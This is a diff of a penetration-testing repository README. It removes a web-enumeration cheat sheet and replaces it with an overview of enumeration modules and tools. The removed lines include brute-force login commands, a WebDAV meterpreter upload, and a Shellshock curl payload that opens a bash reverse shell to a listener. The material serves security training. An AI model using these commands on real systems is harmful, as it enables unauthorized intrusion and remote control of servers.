@@ -1,331 +1,187 @@
-## Web Enumeration
-
-Web enumeration means to look out info about services running on port, versions, languages, directories and more.
-
-- [Web Enumeration](#web-enumeration)
-  - [Ports](#ports) 
-  - [nmap](#nmap)
-  - [Finding Open Ports](#finding-open-ports)
-  - [Checking Running Service Version](#check-running-service-version)
-  - [Nmap Scripts](#obtaining-information-using-nmap-scripts)
-  - [Directory Searching](#directory-searching)
-    - [DirSearch](#dirsearch)
-    - [Gobuster](#gobuster)
-- [HTTP Method](#http-method)
-  - [Available Methods](#detecting-available-methods)
-  - [Upload File](#upload-file)
-  - [Tools](#tools)
-    - [netcat](#netcat)
-    - [curl](#curl)
-    - [nikto](#nikto)
-    - [davtest](#davtest)
-    - [cadaver](#cadaver)
-- [HTTP Basic Authentication](#http-basic-authentication)
-  - [Tools](#tools)
-    - [hydra](#hydra)
-    - [ncrak](#ncrack)
-    - [medusa](#medusa)
-- [Shellshock Vulnerability](#shellshock-vulnerability)
-  - [Identifying Shellshock Vulnerability](#identifying-shellshock-vulnerability)
-    - [curl](#curl-1)
-    - [nmap](#nmap-1)
-  - [Exploiting Shellshock Vulnerability](#exploiting-shellshock-vulnerability)
-    - [curl](#curl-2)
-    - [Shellshock Python Exploit](#shellshock-python-exploit)
-   
-## ports.
-
-| Service | Port No. | Protocol |
-|---------|----------|----------|
-| HTTP | 80,8080,8081,8000 | TCP |
-| HTTPS | 443,8443,4443 | TCP |
-| Tomcat Startup | 8080 | TCP |
-| Tomcat Startup (SSL) | 8443 | TCP |
-| Tomcat Shutdown | 8005 | TCP |
-| Tomcat AJP Connector | 8009 | TCP |
-| Glassfish HTTP | 8080 | TCP |
-| Glassfish HTTPS | 8181 | TCP |
-| Glassfish Admin Server | 4848 | TCP |
-| Jetty | 8080 | TCP |
-| Jonas Admin Console | 9000 | TCP |
-
-## nmap
-
-	  -Pn: Treat all hosts as online -- skip host discovery
-	  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
-	  -p <port ranges>: Only scan specified ports
-	  -sV: Probe open ports to determine service/version info
-	  -sC: equivalent to --script=default
-	  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
-		   directories, script-files or script-categories
-	  -O: Enable OS detection
-	  -oA <basename>: Output in the three major formats at once
-	  -v: Increase verbosity level (use -vv or more for greater effect)
-	  -A: Enable OS detection, version detection, script scanning, and traceroute
-
-## Finding Open Ports
-
-	# nmap -sT -v -p- $IP
-
-	# nmap -sT -v -p- -oA allports $IP 			##Save Output in File
-
-	# nmap -Pn -sT -v -p- $IP
-
-## Check Running Service Version
-
-	# nmap -sT -sV -sC -A -O -v -p 80,443 $IP
-
-	# nmap -Pn -sT -sV -sC -A -O -v -p 80,443 $IP
-
-## Obtaining Information using nmap Scripts
-
-	# ls /usr/share/nmap/scripts/ | grep http
-
-	# nmap -sT -sV -v -p 80,443 --script=http-enum.nse $IP
-
-	# nmap -sT -sV -v -p 80,443 --script=http-php-version.nse $IP
-
-	# nmap -sT -sV -v -p 80,443 --script=http-put.nse $IP
-
-	# nmap -sT -sV -v -p 80,443 --script=http-shellshock.nse $IP
-
-	# nmap -sT -sV -v -p 80,443 --script=http-slowloris.nse $IP
-
-	# nmap -sT -sV -v -p 80,443 --script=http-vhosts.nse $IP
-	
-## Directory Searching
-
-## Tools
-
-### Dirsearch
-
-Diresearch is an advanced tool to Bruteforce directory on your web machines.
+# 🔍 Offensive Enumeration
 
-    # dirsearch -u http://www.example.com/
-  
-    # dirsearch -u http://www.example.com/ -t 100
-  
-    # dirsearch -u http://www.example.com/ -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-  
-    # dirsearch -u http://www.example.com/ -t 100 -e “php,html,aspx,jsp” -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-    
-    # dirsearch -u http://www.example.com/ -o result.txt
-    
-    -u    -   Target-Url
-    -t    -   Number of threads
-    -w    -   Denotes the path of directory list
-    -e    -   Extensions ( php,jsp,bak,html,png,jpeg )
-    -o    -   Output file
-    
-### Gobuster
+A comprehensive collection of offensive enumeration techniques, tools, and exploits used in penetration testing and red teaming. This repository is organized by specific services and includes detailed enumeration methods, tools, and exploitation techniques.
 
-      # gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://www.example.com
-      
-      # gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://www.example.com -t 50
-      
-      # gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://www.example.com -x php,txt,bak	
-      
-      # gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://www.example.com -o /tmp/result.txt
-      
-      -u    -   Target-Url
-      -w    -   Denotes the path of directory list
-      -t    -   Number of threads
-      -x    -   Extensions ( php,jsp,bak,html,png,jpeg )
-      -o    -   Output file
-      
-  You can also find sub-domains with gobuster
-  
-      # gobuster vhost -u http://example.name -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
-      
+---
 
-## HTTP Method
+## 📂 Repository Structure
 
-| Method | Syntax | Description |
-|--------|--------|-------------|
-| GET | GET /index.html |GET method requests a representation of the specified resource. Requests using GET should only retrieve data. |
-| HEAD | HEAD /index.html |HEAD method requests the headers that would be returned if the HEAD request's URL was instead requested with the HTTP GET method.  |
-| POST | POST /test |POST method is used to submit an entity to the specified resource, often causing a change in state or side effects on the server. |
-| PUT | PUT /new.html HTTP/1.1 | The PUT method replaces all current representations of the target resource with the request payload. |
-| DELETE | DELETE /file.html HTTP/1.1 |DELETE request method deletes the specified resource. |
-| CONNECT | CONNECT www.example.com:443 HTTP/1.1 |CONNECT method starts two-way communications with the requested resource. It can be used to open a tunnel. |
-| OPTIONS | OPTIONS /index.html HTTP/1.1 |OPTIONS method requests permitted communication options for a given URL or server. A client can specify a URL with this method, or an asterisk (*) to refer to the entire server. |
-| TRACE | TRACE /index.html |TRACE method performs a message loop-back test along the path to the target resource, providing a useful debugging mechanism. |
-| PATCH | PATCH /file.txt HTTP/1.1 |PATCH request method applies partial modifications to a resource. |
+This repository is structured into service-specific folders, each containing Markdown files that cover specific enumeration techniques and exploitation methods.
 
-## Detecting Available Methods 
+### 🕸️ Web Enumeration
 
-	# nmap -sT -sV -v -p 80,443 --script=http-methods.nse $IP
+Web enumeration focuses on identifying open ports, services, and potential vulnerabilities in web servers. The following topics are covered:
 
-	# nmap -sT -sV -v -p 80,443 --script=http-method-tamper.nse $IP
+* **Ports:** Identifying open ports using Nmap and other tools.
+* **Nmap Scanning:** Basic to advanced Nmap scans for HTTP services.
+* **Service Version Detection:** Identifying running service versions.
+* **Nmap Scripts:** Utilizing NSE scripts for web enumeration.
+* **Directory Searching:** Discovering hidden directories using tools like DirSearch and Gobuster.
 
-## Upload File
+### 🌐 HTTP Methods
 
-	# nmap -p 80 --script http-methods --script-args http-methods.url-path='/index.php' $IP
+Identifying and exploiting HTTP methods to uncover potential attack vectors. Topics covered include:
 
-	# nmap -p 80 --script http-methods --script-args http-method.test-all ='/192.168.1.100' 192.168.1.100
-	
-	# nmap -p 80 192.168.1.100 --script http-put --script-args http-put.url='/dav/test.php',http-put.file='/dev/shm/test.php'
+* Available Methods
+* File Upload Techniques
+* Tools for Testing:
 
-## Tools
+  * netcat
+  * curl
+  * nikto
+  * davtest
 
-## netcat
+### 📦 FTP Enumeration
 
-	# nc 192.168.1.100 80
-		HEAD /admin HTTP/1.1
+Identifying and exploiting FTP services, including:
 
-	# nc 192.168.1.100 80
-		TRACE / HTTP/1.1
+* Anonymous Login Testing
+* Brute Forcing FTP Credentials
+* Enumerating FTP Directories
+* Tools:
 
-	# nc 192.168.1.100 80
-		OPTIONS  http://192.168.1.100 / HTTP/1.0
-		
-## curl
+  * ftp
+  * Hydra
+  * Nmap FTP Scripts
 
-	# curl -X GET 192.168.1.100
+### 🛢️ MySQL Enumeration
 
-	# curl -X OPTIONS 192.168.1.100
+MySQL database enumeration techniques, including:
 
-	# curl -X OPTIONS 192.168.1.100/webdev -v
+* Identifying Open MySQL Ports
+* Brute Forcing MySQL Credentials
+* Database Structure Analysis
+* Tools:
 
-	# curl -X POST 192.168.1.100
+  * mysql
+  * Nmap
+  * Metasploit
+  * sqlmap
 
-	# curl -X PUT 192.168.1.100/uploads
+### 📚 LDAP Enumeration
 
-	# curl -X DELETE 192.168.1.100
+LDAP enumeration for identifying user accounts and other sensitive data:
 
-	# curl 192.168.1.100/uploads --upload-file demo.txt
+* LDAP Service Discovery
+* Extracting User Information
+* Tools:
 
-	# curl -I 192.168.1.100
+  * ldapsearch
+  * Nmap LDAP Scripts
 
-## nikto 
+### 🖥️ RDP Enumeration
 
-	# nikto -h 192.168.1.100
-	
-## davtest
+Identifying and enumerating RDP services to uncover potential vulnerabilities:
 
-	# davtest --help
+* Discovering RDP Services
+* Checking Weak Credentials
+* Exploiting RDP Misconfigurations
+* Tools:
 
-	# davtest -url http://192.168.1.100/dav/
+  * Nmap RDP Scripts
+  * rdesktop
+  * xfreerdp
 
-## cadaver
+### 🛠️ SSH Enumeration
 
-	# cadaver --help
+Enumerating SSH services to identify potential weaknesses:
 
-	# cadaver http://192.168.1.100/dav/
-		put /dev/shm/shell.php
+* Enumerating SSH Banner and Version
+* Brute Forcing SSH Credentials
+* Analyzing SSH Configurations
+* Tools:
 
-	# msfconsole
-		msf> use auxiliary/scanner/http/http_put
-		msf>auxiliary (http_put) > set rhosts 192.168.1.100
-		msf>auxiliary (http_put) > set payload php/meterpreter/reverse_tcp
-		msf>auxiliary (http_put) > set path /dav/
-		msf>auxiliary (http_put) > set filename meter.php
-		msf>auxiliary (http_put) > set filedata file://root/Desktop/meter.php
-		msf>auxiliary (http_put) > exploit
+  * Nmap SSH Scripts
+  * Hydra
+  * ssh-audit
 
-## HTTP Basic Authentication
+### 📡 Telnet Enumeration
 
-HTTP Basic Authentication implementation is the tehnique for enforce access control of the web server from unauthorised access, It doesn't required cookies.
+Identifying and exploiting Telnet services:
 
-## Tools
+* Checking for Open Telnet Ports
+* Brute Forcing Telnet Logins
+* Banner Grabbing and Analysis
+* Tools:
+
+  * telnet
+  * Hydra
+  * Nmap Telnet Scripts
+
+### 🖥️ VNC Enumeration
+
+Identifying and exploiting VNC services:
+
+* Detecting Open VNC Ports
+* Brute Forcing VNC Passwords
+* Analyzing VNC Configuration
+* Tools:
+
+  * Nmap VNC Scripts
+  * vncviewer
+  * vncsnapshot
+
+---
+
+## 📄 Modules and Detailed Techniques
+
+| File                                                     | Description                                                        |
+| -------------------------------------------------------- | ------------------------------------------------------------------ |
+| `Enumeration.md`                                         | Comprehensive overview of general web enumeration techniques.      |
+| `HTTP-Methods.md`                                        | Detailed exploration of HTTP methods and potential attack vectors. |
+| `Hydra-HTTP-Basic-Authentication-Brute-Force.md`         | Techniques for brute-forcing HTTP Basic Auth using Hydra.          |
+| `Nmap-HTTP-NSE-Scripts.md`                               | A guide to using Nmap NSE scripts for HTTP services.               |
+| `PHP-Version-Detection-and-Vulnerabilities.md`           | Detecting PHP versions and associated vulnerabilities.             |
+| `WebDAV-Enumeration.md`                                  | Discovering and exploiting WebDAV vulnerabilities.                 |
+| `Web-Server-Scanner.md`                                  | Scanning web servers with Nikto and DavTest.                       |
+| `Shellshock-Remote-Command-Injection-(CVE-2014-6271).md` | Exploiting the Shellshock vulnerability.                           |
+| `Nostromo-1.9.6-exploit.md`                              | Detailed exploitation of Nostromo web server.                      |
+| `OpenLuck.md`                                            | Write-up on exploiting OpenLuck.                                   |
+| `Upgrading to a Full Interactive Shell.md`               | Techniques for upgrading to a fully interactive shell.             |
+| `FTP-Enumeration.md`                                     | Techniques for enumerating FTP services and directories.           |
+| `MySQL-Enumeration.md`                                   | Identifying MySQL services and enumerating databases.              |
+| `LDAP-Enumeration.md`                                    | Extracting user data through LDAP enumeration.                     |
+| `RDP-Enumeration.md`                                     | Techniques for identifying and exploiting RDP services.            |
+| `SSH-Enumeration.md`                                     | Methods for enumerating SSH services and configurations.           |
+| `Telnet-Enumeration.md`                                  | Techniques for enumerating Telnet services.                        |
+| `VNC-Enumeration.md`                                     | Identifying and exploiting VNC services.                           |
+
+---
+
+## 🛠 Tools Covered
+
+* `nmap` - Network scanning and enumeration
+* `Hydra` - Brute-forcing HTTP, FTP, SSH, Telnet, and VNC authentication
+* `Nikto` - Web server vulnerability scanning
+* `Gobuster` - Directory and file brute-forcing
+* `DirSearch` - Web directory enumeration
+* `DavTest` - Testing WebDAV vulnerabilities
+* `netcat` - Network utility for reading/writing data
+* `curl` - Command-line tool for transferring data
+* `ftp` - FTP client for file transfer and enumeration
+* `mysql` - MySQL client for database enumeration
+* `ldapsearch` - LDAP querying tool
+* `rdesktop` - Remote Desktop Protocol client
+* `xfreerdp` - Free RDP client
+* `ssh-audit` - SSH server auditing tool
+* `telnet` - Telnet client for testing and enumeration
+* `vncviewer` - VNC client for remote access
+* `vncsnapshot` - Capture screenshots of VNC sessions
+
+---
+
+## 👥  Contributing
+
+💪 **Got New Techniques or Tools?**
+Your contributions can make this repository even better! If you have additional techniques, tools, or improvements, fork the repository and submit a pull request.
+
+🔥 **Let’s Collaborate!**
+Check out the open issues, suggest new ideas, or refine existing modules. Your input is invaluable!
+
+[![Contribute](https://contrib.rocks/image?repo=InfoSecWarrior/Offensive-Enumeration)](https://github.com/InfoSecWarrior/Offensive-Enumeration)
+
+---
+
+##
 
-### hydra
 
-Hydra is a parallelized login cracker which supports numerous protocols to attack. New modules are easy to add, beside that, it is flexible and very fast.
-This tool gives researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system
-
-	# hydra -l admin -P /usr/share/wordlists/rockyou.txt http-head://www.example.com/
-
-	# hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt http-head://www.example.com
-
-	# hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt  -P /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt http-head://www.example.com
-
-	# hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt http-get://www.example.com
-
-	# hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt  -P /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt http-get://www.example.com
-
-	# hydra -L user.txt -P pass.txt 192.168.1.100 http-get
-
-	-L denotes the path of username List
-	-P denotes the path of Password List
-	-l represent the username
-	-p represent the password
-	
-### ncrack
-
-Ncrack is an open source tool for network authentication cracking. It was designed for high-speed parallel cracking using a dynamic engine that can adapt to
-different network situations. Ncrack can also be extensively fine-tuned for special cases, though the default parameters are generic enough to cover almost
-every situation. It is built on a modular architecture that allows for easy extension to support additional protocols. Ncrack is designed for companies and
-security professionals to audit large networks for default or weak passwords in a rapid and reliable way. It can also be used to conduct fairly sophisticated
-and intensive brute force attacks against individual services.
-
-	# ncrack -v -U user.txt -P pass.txt http://192.168.1.100
-
-	# ncrack -v --user user.txt --pass pass.txt http://192.168.1.100
-
-	# ncrack -v -user admin -P pass.txt http://192.168.1.100
-
-	# ncrack -v -user admin,administrator -p pass,password,pass@123 http://192.168.1.100
-
-	# ncrack -v -user admin,administrator -P pass.txt http://192.168.1.100
-
-	-v Verbosity
-	-U Denotes the path of user list
-	-P Denotes the path of password list
-	-user Denotes the username with comma seprated
-	-pass Denotes the password with comma seprated
-	-T[0-5] set timing template
-	
-### Medusa
-
-Medusa is intended to be a speedy, massively parallel, modular, login brute-forcer.  The goal is to support as many services which allow remote authentication
-as possible. The author considers following items to some of the key features of this application:
-
-	# medusa -h 192.168.1.100 -U user.txt -p p@$$w0rd -M http -f
-
-	# medusa -h 192.168.1.100 -u admin -P pass.txt -M http -f
-
-	# medusa -h 192.168.1.100 -U user.txt -P pass.txt -M http -f
-
-	# medusa -h 192.168.1.100 -c combo.txt -M http -f
-	[-c Combo files are colon separated and in the following format: host:user:password]
-
-	-h host or url
-	-U Denotes the path of user list
-	-P Denotes the path of passowrd list
-	-u Denotes the username with comma seprated
-	-p Denotes the password with comma seprated
-	-c Denotes the combo file colon seprated
-	-M module name to be execute.
-
-## Shellshock Vulnerability
-
-## Identifying Shellshock Vulnerability
-
-### curl
-
-	# curl -v -H "user-agent: () { :; }; echo; /bin/bash -c 'echo 'Vulnerable\ to\ ShellShock''"  http://example.com/cgi-dir/cgiscript
-	
-### nmap
-
-	# nmap -v -sT -sV -p 80 --script http-shellshock.nse --script-args http-shellshock.uri='/cgi-dir/cgiscript' $IP
-	
-## Exploiting Shellshock Vulnerability
-
-### curl
-
-	Start listener for reverse shell
-	
-	# nc -nlvp 443
-
-	# curl -v -H "user-agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.10/443 0>&1'"  http://example.com/cgi-dir/script
-	
-### Shellshock Python Exploit
-
-[Exploit Link](https://www.exploit-db.com/exploits/34900)
-
-Edit Exploit	-	Mention Vulnerable Cgi-script Here
-	
-```bash
-pages = ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]
-```
